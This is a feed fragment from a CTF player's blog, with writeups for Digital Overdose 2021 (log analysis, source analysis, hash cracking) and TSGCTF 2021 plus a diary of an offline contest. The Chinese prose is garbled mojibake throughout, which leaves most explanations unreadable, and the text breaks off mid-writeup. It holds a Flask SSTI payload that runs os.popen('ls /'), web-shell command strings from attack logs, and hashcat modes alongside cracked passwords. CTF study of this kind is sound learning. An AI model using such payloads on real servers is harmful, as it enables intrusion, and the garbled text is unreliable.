&lt;p>å‚è€ƒï¼š&lt;a href="https://anakint.medium.com/digital-overdose-2021-autumn-ctf-writeup-madlib-web-c51c5ded5260">Digital Overdose 2021 Autumn CTF Writeup â€” madlib (web)&lt;/a>&lt;/p>
&lt;h2 id="log-analysispart1---ingress">Log Analysis/Part1 - Ingress&lt;/h2>
&lt;blockquote>
&lt;p>Our website was hacked recently and the attackers completely ransomwared our server!&lt;/p>
&lt;p>We&amp;rsquo;ve recovered it now, but we don&amp;rsquo;t want it to happen again.&lt;/p>
&lt;p>Here are the logs from before the attack, can you find out what happened?&lt;/p>
&lt;/blockquote>
&lt;p>ç»™å‡ºäº†è®¿é—®æ—¥å¿—ï¼Œæœ‰åºå¤§çš„æ•°æ®ï¼Œnè¡Œ~~ï¼Œä½†æ˜¯ä¸å¤ªä¼šçœ‹~~&lt;/p>
&lt;p>åœ¨37557è¡Œå‡ºç°äº†è®¿é—®&lt;code>/ywesusnz cmd%3Dcd+..&lt;/code>ï¼Œå¾€åè¿˜æœ‰ä¸€äº›ywesusnzå¼€å¤´çš„ï¼Œ37629è¡Œå‡ºç°äº†&lt;code>/ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==&lt;/code>ï¼Œb64è§£å¯†&lt;/p>
&lt;p>&lt;code>DO{better_remove_that_backdoor}&lt;/code>&lt;/p>
&lt;h2 id="log-analysispart-2---investigation">Log Analysis/Part 2 - Investigation&lt;/h2>
&lt;blockquote>
&lt;p>Thanks for finding the RFI vulnerability in our FAQ. We have fixed it now, but we don&amp;rsquo;t understand how the attacker found it so quickly.&lt;/p>
&lt;p>We suspect it might be an inside job, but maybe they got the source another way. Here are the logs for the month prior to the attack, can you see anything suspicious?&lt;/p>
&lt;p>Please submit the attackers IP as the flag as follow, DO{x.x.x.x}&lt;/p>
&lt;/blockquote>
&lt;p>ä»ç„¶æ˜¯ç»™å‡ºäº†å¾ˆå¤šè¡Œçš„æ—¥å¿—&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022081303705.png" alt="image-20211022081303705">&lt;/p>
&lt;p>å‘ç°äº†å¯ç–‘çš„å†…å®¹&lt;code>DO{45.85.1.176}&lt;/code> ä½†æ˜¯æäº¤flagé”™è¯¯&lt;/p>
&lt;p>ï¼ˆç„¶åå‘ç°æ˜¯å¾ˆå‚»é€¼çš„æŠŠ200.13.84.124å½“ä½œflagäº¤äº†â€¦â€¦&lt;/p>
&lt;h2 id="log-analysispart-3---backup-policy">Log Analysis/Part 3 - Backup Policy&lt;/h2>
&lt;blockquote>
&lt;p>So it looks like the attacker scanned our site for old backups right? Did he get one?&lt;/p>
&lt;/blockquote>
&lt;p>æ¥ç€æ‰¾ï¼Œå‘ç°äº†/backup.zipçš„è¯·æ±‚æ˜¯200ok&lt;/p>
&lt;p>ä½†æ˜¯äº¤flagçš„æ—¶å€™ä¸çŸ¥é“äº¤å•¥ï¼Œçœ‹äº†wpæ‰å‘ç°è—åœ¨äº†UAå¤´é‡Œ&lt;/p>
&lt;pre tabindex="0">&lt;code>Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36
&lt;/code>&lt;/pre>&lt;p>å°†ä¸­é—´é‚£ä¸€ä¸²b64è§£å¯†åå¾—åˆ°&lt;/p>
&lt;p>&lt;code>DO{s3cr3t___agent}&lt;/code>&lt;/p>
&lt;h2 id="source-analysisa1---c-nanigans">Source Analysis/A1 - C-nanigans&lt;/h2>
&lt;blockquote>
&lt;p>Find the flag parts in the source code, assemble the flag, submit the flag.&lt;/p>
&lt;p>(This code may not compile, and it is useless to attempt to do so)&lt;/p>
&lt;/blockquote>
&lt;p>æç¤ºæˆ‘ä»¬å…³æ³¨æºç è€Œä¸æ˜¯ç¼–è¯‘&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084007781.png" alt="image-20211022084007781">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022083958098.png" alt="image-20211022083958098">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084018091.png" alt="image-20211022084018091">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084123654.png" alt="image-20211022084123654">&lt;/p>
&lt;pre tabindex="0">&lt;code>444f7b
733075526333
5f406e616c79333173
7d
&lt;/code>&lt;/pre>&lt;p>hexè§£å¯†åå¾—åˆ°&lt;code>DO{s0uRc3_@naly31s}&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-1">Hash Cracking/Hash 1&lt;/h2>
&lt;pre tabindex="0">&lt;code>54a09c22fc0d1af44865e411ff6e8d50
&lt;/code>&lt;/pre>&lt;p>&lt;code>phantomlover&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-2">Hash Cracking/Hash 2&lt;/h2>
&lt;pre tabindex="0">&lt;code>52ed4b109a2662fdf15edfd95632667869fc5802
&lt;/code>&lt;/pre>&lt;p>&lt;code>fishchips&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-3">Hash Cracking/Hash 3&lt;/h2>
&lt;pre tabindex="0">&lt;code>550b57fc03f0a800fab603cb8eb4e29fbd5c76655d7ab995b1fe9c6ddf963a3d2627ebd79e067022f792bb2490a260c051aecbc4a7aedb3ec5dbf9439cd66f81
&lt;/code>&lt;/pre>&lt;p>&lt;code>mommadobbins&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-4">Hash Cracking/Hash 4&lt;/h2>
&lt;pre tabindex="0">&lt;code>451716a045ca5ec7f25e191ab5244c61aaeeb008c4753a2065e276f1baba4723
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://md5hashing.net/hash_type_checker">Hash Identifier&lt;/a>&lt;/p>
&lt;p>hashcat -m 6900 ghost&lt;/p>
&lt;p>&lt;code>happyfamily&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-5">Hash Cracking/Hash 5&lt;/h2>
&lt;pre tabindex="0">&lt;code>$2a$10$QlR/ZlXgQPWfx9JmRffMZutcL3o3w6JAiRbfvGda4u09lrfOvgcH6
&lt;/code>&lt;/pre>&lt;p>hashcat -m 3200 bcrypt&lt;/p>
&lt;p>&lt;code>cowabunga&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-6">Hash Cracking/Hash 6&lt;/h2>
&lt;pre tabindex="0">&lt;code>$1$veryrand$QetWu27IoJ2FFSG30xKAQ.
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://www.tunnelsup.com/hash-analyzer/">Hash Analyzer&lt;/a>&lt;/p>
&lt;p>hashcat -m 500 MD5-Crypt&lt;/p>
&lt;p>&lt;code>scottiebanks&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-7">Hash Cracking/Hash 7&lt;/h2>
&lt;pre tabindex="0">&lt;code>$6$veryrandomsalt$t8EIWEiDpWYzeC1c44q7f6ZENOuO2wagnrJBPs4d/PptWxAxlnH7qRcf0xnKagaOEHBN9dGBV5Y1syJSB3s6H1
&lt;/code>&lt;/pre>&lt;p>hashcat -m 1800 sha512crypt $6$&lt;/p>
&lt;p>&lt;code>igetmoney&lt;/code>&lt;/p>
&lt;hr>
&lt;p>å¾ˆæ°´çš„wpï¼Œæˆ–è€…è¯´æ˜¯å¤ç°ï¼Œæ²¡æœ‰ä»€ä¹ˆå‚è€ƒä»·å€¼ï¼›æŒºæœ‰æ„æ€çš„é¢˜ï¼Œå­¦åˆ°äº†sstiçš„æ–°trickï¼›Source Analysisçš„å‰©ä¸‹ä¸¤ä¸ªé¢˜å…¨æ˜¯web+reverse/crypto/pwnï¼ˆæŒ‡è·¯wp: &lt;a href="https://lo0l.com/2021/10/11/digitaloverdose.html#source-analysis---boris">Boris&lt;/a> | &lt;a href="https://github.com/maulvialf/CTF-Writeups/tree/main/2021/004-digitaloverdose/source-analysis/c1-i_think_this_should_be_c4">I think this could be C4&lt;/a>ï¼‰ï¼Œè°¢è°¢ï¼Œå®Œå…¨çœ‹ä¸æ‡‚ï¼Œå·²ç»è·ªäº†&lt;/p>
&lt;p>webç‹—æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡&lt;/p>
&lt;p>ğŸ˜…&lt;/p></description></item><item><title>2021å¼ºç½‘æ¯é’å°‘èµ›çº¿ä¸‹èµ›å‚èµ›è®°å½•</title><link>https://amiaaaz.github.io/2021/10/18/2021-qwbqss-a-short-diary/</link><pubDate>Mon, 18 Oct 2021 20:38:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/18/2021-qwbqss-a-short-diary/</guid><description>&lt;h2 id="æ¯”èµ›å‰ä¸€å¤©15å·">æ¯”èµ›å‰ä¸€å¤©/15å·&lt;/h2>
&lt;p>ä¸‹åˆ2ç‚¹50çš„é£æœºï¼Œç»“æœä¸´å‡ºå­¦æ ¡å‰å‘ç°èº«ä»½è¯ä¸¢äº†ï¼Œè´¼å°´å°¬ï¼Œæ‰¾äº†ä¸¤åœˆæ²¡æ‰¾åˆ°å°±ç›´æ¥å»æœºåœºäº†ï¼Œç”¨ä¸´æ—¶èº«ä»½è¯æ˜ä¸Šäº†é£æœºä¹‹åæ”¶åˆ°ç”µè¯è¯´èº«ä»½è¯è¢«æ¡åˆ°äº†orz è¿™ä¹ˆä½çº§çš„é”™è¯¯ä¸‹æ¬¡ç»ä¸ä¼šæœ‰äº†TAT&lt;/p>
&lt;p>åˆ°éƒ‘å·ä¹‹åæ‰“æ»´æ»´ç»“æœå¸æœºç”µè¯æ‰“ä¸é€šï¼Œåˆæ­£å¥½ä¸‹é›¨ï¼Œè·Ÿé˜Ÿå‹ä¸€èµ·ä¸Šäº†ä¸ªæ‰“è¡¨é£å¿«çš„å°é»‘è½¦ï¼Œåˆ°åœ°é“ç«™é—¨å£å°±148å—é’±ï¼Œè¿˜å¥½æœ€ååªç»™äº†100ï¼Œä½†æ˜¯ä¹Ÿå¤ªä»–å¦ˆçš„å‘äº†&lt;/p>
&lt;p>ä¹‹åæŒ¤äººè´¼å¤šçš„åœ°é“ï¼Œå…ˆå»é…’åº—é™„è¿‘çš„æ´¾å‡ºæ‰€å¼€äº†ä¸ªè¯æ˜ï¼Œç„¶ååˆ°é…’åº—ä½ä¸‹ï¼Œé¥­è¿˜è¡Œï¼Œæ˜¯1å±‚è‡ªåŠ©é¤ï¼Œæˆ‘è·Ÿå¦ä¸€ä¸ªå°å§å§ä½ä¸€ä¸ªæˆ¿é—´&lt;/p>
&lt;h2 id="æ¯”èµ›ç¬¬ä¸€å¤©16å·">æ¯”èµ›ç¬¬ä¸€å¤©/16å·&lt;/h2>
&lt;p>æ—©ä¸Šèµ·æ¥ä¹‹åè·ŸåŒé˜Ÿçš„ä¸¤ä¸ªå¸ˆå‚…å»ç§‘æŠ€é¦†ç­¾åˆ°ï¼Œé¢†è¡£æœå’Œå‚èµ›è¯ï¼ˆé‚£è¾¹çš„å¿—æ„¿è€…æ˜¯éƒ‘å·ä¸­å­¦çš„å°å§å§ä»¬ï¼Œé¢œå€¼è¶…é«˜&lt;/p>
&lt;p>ç„¶åå½©æ’äº†ä¸€ä¸‹é€‰æ‰‹å‘è¨€ï¼Œå›å»åƒä¸­é¥­ï¼ˆé»˜é»˜åæ§½ä¸€ä¸‹æŸå‡ ä½å¸ˆå‚…å»å‚è§‚ç§‘æŠ€é¦†æ²¡å¸¦æˆ‘ç©è¿™ä»¶äº‹äº†ï¼ï¼ï¼è®°ä»‡ = =ã€‚&lt;/p>
&lt;p>3ç‚¹åŠå¼€å¹•å¼ï¼Œæˆ‘é»˜é»˜åšäº†ä¸ªé€‰æ‰‹ä»£è¡¨å‘è¨€ï¼ˆè¡¨æƒ…ç®¡ç†å¤§å¤±è´¥ æ‰€æœ‰ç…§ç‰‡éƒ½æ‹å¾—è´¼ä¸‘ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/486A35615FE4F32ED871A0AFBD697DC6.jpg" alt="img">&lt;/p>
&lt;p>4ç‚¹å¼€èµ›ï¼ŒçœŸä¸æ„§æ˜¯è·‘ç”·æ¨¡å¼ï¼ŒæŠŠæˆ‘ä¸€æ•´å¹´çš„è¿åŠ¨é‡éƒ½ç»™è·‘å®Œäº†ï¼ŒæˆåŠŸå…‹æœäº†ä¸æ•¢åæ‰‹æ‰¶ç”µæ¢¯çš„ææƒ§ç—‡ï¼Œç§‘æŠ€é¦†4å±‚ä¸Šä¸‹æ¥å›è·‘&lt;/p>
&lt;p>æœ€å¼€å§‹ç»™çš„é¢˜æ˜¯è¦åœ¨ç§‘æŠ€é¦†ä¸­æ‰¾åˆ°5å¼ å›¾ç‰‡ä¸Šçš„åœ°æ–¹å¹¶ä¸”æ‹ç…§ï¼Œè¿™æ˜¯æœ€è€—ä½“åŠ›çš„ï¼Œè·‘ç€è·‘ç€å°±è¿·è·¯äº†ï¼ˆåæ¥æƒ³çš„è¯ï¼Œè¿™ä¸ªç¯èŠ‚åˆä¸ç»™åˆ†ï¼Œä¸€å¼€å§‹å°±è½æœ‰ç‚¹è‰ç‡ï¼Œå¯ä»¥ç›´æ¥åšåˆ«çš„é¢˜ï¼‰&lt;/p>
&lt;p>ç„¶ååé¢çš„é¢˜åˆ†æ•£åœ¨1234å±‚ï¼Œæœ‰çš„é¢˜æ˜¯åªèƒ½åšä¸€æ¬¡ä½†æ˜¯ä¸é™æ—¶ï¼Œæœ‰çš„æ˜¯é™æ—¶åˆåªèƒ½ä¸€æ¬¡ï¼Œæ ¹æ®è§£å‡ºçš„ç¨‹åº¦ç»™å¡ç‰‡ï¼ŒæŠŠä¸Šé¢çš„æˆè¯­ä½œä¸ºflagäº¤åˆ°å¹³å°ä¸Š&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/F4E04C905C58822FD7EEB22861986EC7.jpg" alt="img">&lt;/p>
&lt;p>è¯´è¯´å‡ ä¸ªå°è±¡æ·±åˆ»çš„é¢˜å§ï¼Œç«ç„°ç†Šç†Šï¼Œçº¢è‰²é©å‘½é˜…è¯»ç†è§£é¢˜ï¼Œç»™å‡ å¼ çº¸é˜…è¯»å±•æ¿ä¸Šçš„å†…å®¹ç„¶åç­”é¢˜ï¼Œä¸å¤ªå¥½æ‰¾ï¼Œæ‹¿äº†1600åˆ†ï¼Œ10åˆ†é’Ÿä¸å¤ªå¤Ÿç”¨ï¼Œæœ‰å‡ ä¸ªæ˜¯è’™ä¸Šå»çš„&lt;/p>
&lt;p>é˜¿å°¼ç›æ ¼æ–¯ï¼Œåˆšå¼€å§‹æˆ‘è¿‡å»ä¹‹åä¸€çœ‹é¢˜ç›®æè¿°ï¼Œå¥½å®¶ä¼™ï¼Œæ‹Ÿæ€ï¼Œè¿˜æ˜¯åªèƒ½åšä¸€æ¬¡ï¼Œæˆ‘å°±å…ˆèµ°äº†ï¼Œåé¢å†è¿‡æ¥åšçš„æ—¶å€™å‘ç°è¿™ä»–å¦ˆä¹Ÿæ˜¯ä¸ªé˜…è¯»ç†è§£é¢˜ï¼Œè‰ï¼Œè¿˜æ˜¯æœ¬ç«¥è¯ä¹¦ï¼Œå…¨ç¨‹ç½šæŠ„å†™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/C578A65EB1ED41D68D217A0CE037BAA2.jpg" alt="img">&lt;/p>
&lt;p>é˜¿æ‹‰éœæ´å¼€ï¼ŒåŒªå¤·æ‰€æ€çš„é¢˜ï¼Œä»¥ä¸ºæ˜¯æ‰“å¼€å­˜åŒ…æŸœï¼Œæ²¡æƒ³åˆ°å°±æ˜¯æˆ³å¼€å·¦ä¸‹è§’çš„å¼€å§‹ï¼Œç„¶åç‚¹å¼€æ–‡ä»¶å¤¹&lt;/p>
&lt;p>è¿˜æœ‰ä¸ªé¢˜æ˜¯æ‰¾æ‘„åƒå¤´ï¼Œå¿˜äº†å«å•¥åå­—äº†ï¼Œè¯´æ˜¯æœ‰180ä¸ªæ‘„åƒå¤´ï¼Œå‰5åˆ†é’Ÿè‚‰çœ¼çœ‹ï¼Œå5åˆ†é’Ÿèƒ½æ‹¿çº¢å¤–çº¿çš„æ‰«ææªï¼Œåæ­£æ˜¯å°½å¯èƒ½å¾€å¤šäº†åœˆï¼ˆx&lt;/p>
&lt;p>é©±é€éº»ç“œæ˜¯ä¸¤ä¸ªé¢˜ï¼Œä¸€ä¸ªæ˜¯å¯†ç ï¼Œä¸ä¼šè§£ï¼Œphpçš„æ”¾åˆ°æœ€åæ²¡æ—¶é—´çœ‹&lt;/p>
&lt;p>å¾ˆæ— è¯­çš„æ˜¯ä¸€äº›é¡¹ç›®å› ä¸ºåœºåœ°é™åˆ¶è¿˜éœ€è¦æ’é˜Ÿï¼Œæˆ‘ä»¬æ’åˆ°é˜¿æ‹‰éœæ´å¼€è¿™ä¸ªé¢˜çš„æ—¶å€™ç¦»ç»“æŸå°±å‰©10åˆ†é’Ÿäº†ï¼Œè¿˜å¥½è§£çš„æ¯”è¾ƒå¿«&lt;/p>
&lt;p>ä¸­é—´æˆ‘ä»¬é˜Ÿæœ€é«˜åˆ°ç¬¬2åï¼Œæœ€åæˆªæ­¢çš„æ—¶å€™æ˜¯ç¬¬10ï¼Œ8000åˆ†ï¼Œåˆšå¥½æŒ‚åˆ°å¤§å±å¹•ä¸Š&lt;/p>
&lt;p>æ¯”å®Œä¹‹åå¥½å¤šé˜Ÿéƒ½æ¢äº†å¤´åƒå’Œç­¾åï¼Œäºæ˜¯æˆ‘ä»¬æ¢äº†è¿™ä¸ª&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/C%7EOI%5DO%24%24WGX%24KDDTJ0EZ0I2.jpg" alt="img">&lt;/p>
&lt;p>åƒå®Œé¥­å°±8ç‚¹äº†ï¼Œå›å»å‡†å¤‡ç¬¬äºŒå¤©çš„break&amp;amp;fix&lt;/p>
&lt;h2 id="æ¯”èµ›ç¬¬äºŒå¤©17å·">æ¯”èµ›ç¬¬äºŒå¤©/17å·&lt;/h2>
&lt;p>æ—©ä¸Š7ç‚¹åŠå°±å¼€å§‹æ¯”ï¼Œ6ç‚¹åŠèµ·åºŠï¼Œå›°å¾—ä¸€æ‰¹åˆæ²¡èƒƒå£ï¼Œåƒäº†ä¿©è›‹ç³•æ‹¿äº†ä¸ªé…¸å¥¶å°±å»ä¼šåœºäº†&lt;/p>
&lt;p>åŒ†å¿™è¿ä¸Šç½‘çº¿ï¼Œçœ‹äº†æ¯”èµ›æ‰‹å†Œï¼Œawdpæ¨¡å¼ï¼Œæ”¾äº†4é“é¢˜ï¼Œä¸¤ä¸ªpwnä¸¤ä¸ªweb&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/CC3D4B6386081D1C8AACB8D8CC53FF25.jpg" alt="img">&lt;/p>
&lt;p>é¦–å…ˆæ„Ÿè°¢ä¸€ä¸‹pwnğŸ‘´æ—ºæ—ºå¸ˆå‚… ä¸¤ä¸ªé¢˜å…¨å‡ºäº† ååˆ†nb&lt;/p>
&lt;p>webæ–¹é¢ï¼Œä¸€ä¸ªæ˜¯phpååºåˆ—åŒ–ï¼ˆæ€ä¹ˆè€æ˜¯ä½ ï¼‰ å…¨åœº0è§£ï¼ˆç”¨åˆ°äº†åŸç”Ÿç±»çš„ä¸€ä¸ªç‰¹æ€§ å¯ä»¥å‚è€ƒè¿™ä¸ªé¢˜&lt;a href="https://johnfrod.top/ctf/nepctf-2021%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD/">[NepCTF 2021]æ¢¦é‡ŒèŠ±æ¥ç‰¡ä¸¹äº­&lt;/a>ï¼‰ï¼Œä¸€ä¸ªæ˜¯flaskçš„sstiæ³¨å…¥ï¼Œä¸€å¼€å§‹ä¹Ÿæ˜¯0è§£ï¼Œä½†æ˜¯ä¸æ–­çš„æ”¾hintéƒ½æ²¡äººgetåˆ°ä»–çš„æ„æ€ï¼Œç›´åˆ°æœ€åæŠŠpayloadéƒ½ç»™æ”¾å‡ºæ¥äº†æ‰å¼€å§‹æœ‰è§£ï¼Œå¯èƒ½æ˜¯æƒ³çš„ç­¾åˆ°éš¾åº¦ï¼Œä½†æ˜¯å¤§å®¶æ²¡ç­¾ä¸ŠğŸ˜…&lt;/p>
&lt;p>ï¼ˆpayloadæ˜¯&lt;code>{{lipsum['__globals__']['__builtins__']['eval']('__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;ls /&amp;quot;).read()')}}&lt;/code> ï¼‰&lt;/p>
&lt;p>ç„¶åæ˜¯fixé˜¶æ®µï¼Œæˆ‘ä¿®äº†phpï¼Œå¦ä¸€ä½å¸ˆå‚…ä¿®äº†flaskï¼ŒpwnğŸ‘´ä¿®äº†ä¸€é“pwnï¼ˆå¦ä¸€ä¸ªæ²¡æœ‰è¿‡check&lt;/p>
&lt;p>é˜²å¾¡é˜¶æ®µçš„åˆ†åŠ çš„ç‰¹åˆ«å¿«ï¼Œä¿®äº†ä¸¤ä¸ªé¢˜ç›´æ¥å°±å¹²åˆ°ç¬¬ä¸€äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211018212632528.png" alt="image-20211018212632528">&lt;/p>
&lt;p>ï¼ˆå¿½ç•¥æ—¶é—´ è¿™æ˜¯æ™šä¸Šå›æ¥ä¹‹åæˆªçš„å›¾&lt;/p>
&lt;p>åº”è¯¥æœ‰å¾ˆå¤šé˜Ÿä¸ä¼šç”¨dockerçš„ç›¸å…³æ“ä½œåƒäºäº†ï¼Œç¬¬ä¸€è½®fixåªæœ‰å¾ˆå°‘çš„é˜Ÿè¿‡äº†checkï¼Œåˆ°ç¬¬äºŒè½®fixçš„æ—¶å€™è¿˜ç»™äº†dockerå¤åˆ¶æ–‡ä»¶çš„å‘½ä»¤&lt;/p>
&lt;p>è¿™ä¸€åœºå’Œæ˜¨å¤©çš„é‚£åœºç»¼åˆä¸‹æ¥æˆ‘ä»¬æ˜¯8623åˆ†ï¼Œç¬¬äºŒåï¼Œæ‹¿ä¸€ç­‰å¥–~èŠœæ¹–&lt;/p>
&lt;p>ç¬¬ä¸€åæ˜¯åŒ—å¤§çš„ä¸€ä¸ªå¤§ä½¬ï¼Œsoloå…¨åœºï¼Œttttttql&lt;/p>
&lt;h2 id="å°ç»“">å°ç»“&lt;/h2>
&lt;p>è¢«é˜Ÿé‡Œä¸¤ä¸ªå¸ˆå‚…å¸¦ç€ç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹ï¼Œæ„Ÿè§‰è¿˜æ˜¯æŒºæ£’çš„ &lt;del>ï¼Œå…è´¹åƒä½ çˆ½çš„ä¸€æ‰¹&lt;/del>ï¼Œæ„Ÿè§‰çº¿ä¸‹æœ‰ä¸€ç¾¤äººæ‰“ctfæ˜¯ä¸ªæŒºèµ›åšæœ‹å…‹çš„äº‹æƒ…å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ&lt;/p>
&lt;p>æ‰“ä¹‹å‰å…¶å®æ…Œçš„ä¸€æ‰¹ï¼Œæ¯•ç«Ÿè‡ªå·±webæ¯”è¾ƒèœï¼Œå®³æ€•æ‹‰è·¨ï¼Œå®³æ€•ç»™å¤§å®¶æ‹–åè…¿ï¼Œä¸è¿‡è¿˜å¥½æœ€åä¸€åˆ‡é¡ºåˆ©ï¼Œæ‹¿åˆ°äº†ä¸€ç­‰ï¼Œä¹‹å‰ä»ä¸æ•¢è®¾æƒ³çš„&lt;/p>
&lt;p>é…¸èœæ£’æ£’é±¼yyds!!!!!!!!&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022121656282.png" alt="image-20211022121656282">&lt;/p>
&lt;p>ä»å¼€å§‹å­¦ctfï¼Œå­¦å®‰å…¨æ–¹é¢çš„çŸ¥è¯†åˆ°ç°åœ¨ä¹Ÿä¸è¿‡åŠå¹´å¤šä¸€ç‚¹ï¼Œå­¦çš„è¿˜æ˜¯ç›¸å½“ç²—ç³™çš„ï¼Œè§åˆ°çš„å¸ˆå‚…ä»¬éƒ½å­¦çš„æ—¶é—´æ¯”æˆ‘é•¿ï¼Œæ°´å¹³éƒ½æ¯”æˆ‘é«˜å¾ˆå¤šå¾ˆå¤š&lt;/p>
&lt;p>æœªæ¥çš„è·¯è¿˜å¾ˆé•¿ï¼Œä¸ç®¡æ€ä¹ˆæ ·ï¼Œæˆ‘éƒ½ä¼šåšæŒèµ°ä¸‹å»çš„ã€‚&lt;/p></description></item><item><title>TSGCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</link><pubDate>Mon, 04 Oct 2021 16:44:41 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</guid><description>&lt;p>&lt;a href="https://score.ctf.tsg.ne.jp/challenges">https://score.ctf.tsg.ne.jp/challenges&lt;/a> | &lt;a href="https://ctftime.org/event/1431/tasks/">https://ctftime.org/event/1431/tasks/&lt;/a>&lt;/p>
&lt;h2 id="webwelcome-to-tsg-ctf">Web/Welcome to TSG CTF!&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>We want to welcome you,&lt;/strong> &lt;em>seriously.&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004010601885.png" alt="image-20211004010601885">&lt;/p>
&lt;p>æŠ“åŒ…åå‘ç°æˆ‘ä»¬è¾“å…¥çš„å€¼æ˜¯postçš„jsonä¸­çš„keyéƒ¨åˆ†è€Œä¸æ˜¯valueï¼Œå¾ˆå¥‡æ€ª&lt;/p>
&lt;p>ç»™äº†æºç ï¼Œçœ‹ä¸‹app.js&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004083305948.png" alt="image-20211004083305948">&lt;/p>
&lt;p>11è¡Œæœ‰ä¸ªæ¯”è¾ƒï¼Œè¦é€šè¿‡å®ƒï¼Œå¯ä»¥æŠŠbodyç½®ç©ºè®¿é—®ï¼ˆç”¨burpçš„è¯è¦æ”¹ä¸€ä¸‹Content-Typeï¼Œé»˜è®¤çš„application/jsonæ˜¯ä¸èƒ½ç½®ç©ºçš„ï¼‰ï¼Œ&lt;code>typeof null === 'object'&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl &lt;span style="color:#d88200">&amp;#34;http://34.84.69.72:34705/&amp;#34;&lt;/span> -X POST
&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;statusCode&amp;#34;&lt;/span>:500,&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>:&lt;span style="color:#d88200">&amp;#34;Internal Server Error&amp;#34;&lt;/span>,&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span>:&lt;span style="color:#d88200">&amp;#34;Cannot read property &amp;#39;TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}&amp;#39; of null&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>flagä¼šåœ¨æŠ¥é”™ä¸­å‡ºç°ï¼&lt;/p>
&lt;p>&lt;code>TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}&lt;/code>&lt;/p>
&lt;h2 id="webudon">Web/Udon&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>Ta-dah! Here comes udon!&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>Udon Noteï¼Œä¸€çœ¼xssä¹‹ç±»çš„&lt;/p>
&lt;p>æˆ‘ä»¬å‘å‡ºå»çš„noteä¸­çš„å°–æ‹¬å·ä¼šè¢«è½¬ä¹‰ä¸ºå®ä½“å­—ç¬¦ï¼ŒResetä¼šæ¸…ç©ºcookieï¼Œè¿å¸¦ç€æ¶ˆå¤±ä¹‹å‰å‘å¸ƒè¿‡çš„Note&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004080116886.png" alt="image-20211004080116886">&lt;/p>
&lt;p>æœ‰Tell Admin About This Udon Noteçš„é€‰é¡¹&lt;/p>
&lt;p>â€”â€”â€”â€”æ²¡ä»€ä¹ˆæƒ³æ³• ä»¥ä¸‹æ˜¯å¹³æ·¡çš„å¤ç°è¿‡ç¨‹&lt;/p>
&lt;p>çœ‹æºç ï¼Œmain.go&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004155626744.png" alt="image-20211004155626744">&lt;/p>
